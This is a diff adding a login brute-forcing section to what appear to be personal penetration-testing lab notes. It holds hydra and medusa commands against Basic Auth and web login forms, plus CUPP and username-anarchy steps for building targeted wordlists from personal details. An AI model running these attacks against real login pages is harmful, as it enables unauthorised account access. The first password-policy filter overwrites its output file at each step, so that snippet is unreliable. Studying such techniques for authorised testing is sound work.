@@ -1663,4 +1663,108 @@ description:
 >```
 >>[!code]- Result
 >>![[Images/Pasted image 20250717073426.png]]
+### Login Brute Forcing
 
+>[!code]- Filter a password list to a password policy
+>Password policy:
+>- **Minimum length:** 8 chars
+>- **Must include:** at least one upper case letter, lower case letter, one number
+>
+>```powershell
+># Minimum length of 8
+>grep -E '^.{8,}$' password.list > output.txt
+>
+># At least one upper/lower case character
+>grep -E '[A-Z]' password.list > output.txt
+>grep -E '[a-z]' password.list > output.txt
+>
+># At least one number
+>grep -E '[0-9]' password.list > output.txt
+>```
+
+>[!code]- Basic HTTP Authentication
+>>[!code]- The general process
+>>1. User requests access to a webpage
+>>2. Server responds with a `401 Unauthorized` status code and a `WWW-Authenticate` header, thus prompting the user's browser to present a login box
+>>3. Once the user provides a username and password, the browser concatenates them into a single string, separated by a colon
+>>4. The string is then base64 encoded and sent within the `Authorization` header of any subsequent requests, using the format `Basic <encoded_credentials>`
+>>5. The server decodes the credentials, verifies them, and grants or denies access accordingly
+>>
+>>The headers for Basic Auth in a HTTP GET request:
+>>
+>>![[Images/Pasted image 20250722081708.png]]
+>
+>###### Brute forcing
+>```powershell
+>hydra -l basic-auth-user -P password_list 127.0.0.1 http-get / -s 81
+>
+>medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
+>```
+
+>[!code]- Login Forms
+>>[!code]- Explained
+>>Example login form HTML:
+>>
+>>![[Images/Pasted image 20250722083458.png]]
+>>
+>>Upon clicking the `submit` button, the following POST request is sent to `/login`:
+>>
+>>![[Images/Pasted image 20250722083537.png]]
+>>
+>>- The `Content-Type` header specifies how the data is encoded in the request body
+>>- The `Content-Length` header indicates the size of the data being sent
+>
+>###### Brute forcing
+>
+>```powershell
+>hydra [options] target http-post-form "path:params:condition_string"
+>hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
+>hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+>hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
+>
+># Condition string
+># F=... to determine when a login attempt has failed
+># For example `F=Invalid credentials`
+>
+># S=... to determine when a login attempt has succeeded
+># For example `S=302` or `S=Dashboard`
+>
+># Altogether now
+>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+>
+>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
+>```
+
+>[!code]- Custom wordlists
+>###### Username variations
+>```powershell
+># Install Anarchy
+>sudo apt install ruby -y
+>git clone https://github.com/urbanadventurer/username-anarchy.git
+>cd username-anarchy
+>
+># List variation options
+>./username-anarchy -l
+>
+># Create username variations
+>./username-anarchy Jane Smith > jane_smith_usernames.txt
+>```
+>###### Password variations
+>>[!code]- CUPP example
+>>It takes OSINT information to generate passwords.
+>>
+>>![[Images/Pasted image 20250724065706.png]]
+>
+>```powershell
+># Install
+>sudo apt install cupp -y
+>
+># Interactive mode
+>cupp -i
+>```
+>###### Password policies
+>- Minimum length: `grep -E '^.{6,}$'`
+>- Must include at least one uppercase letter: `grep -E '[A-Z]'`
+>- Must include at least one lowercase letter: `grep -E '[a-z]'`
+>- Must include at least one number: `grep -E '[0-9]'`
+>- Must include at least two special chars (set given): `grep -E '([!@#$%^&*].*){2,}'`
